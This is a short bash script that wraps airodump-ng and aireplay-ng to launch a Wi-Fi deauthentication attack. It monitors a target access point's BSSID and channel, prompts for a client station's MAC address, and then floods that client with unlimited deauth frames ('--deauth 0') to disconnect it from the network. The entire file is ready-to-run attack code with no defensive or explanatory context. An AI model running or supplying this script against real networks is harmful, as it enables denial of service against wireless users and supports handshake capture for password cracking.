#!/bin/bash


xterm -e airodump-ng wlan0 --bssid $1 --channel $2 &
echo "Enter Station: "
read station
aireplay-ng --deauth 0 -a $1 -c $station $3
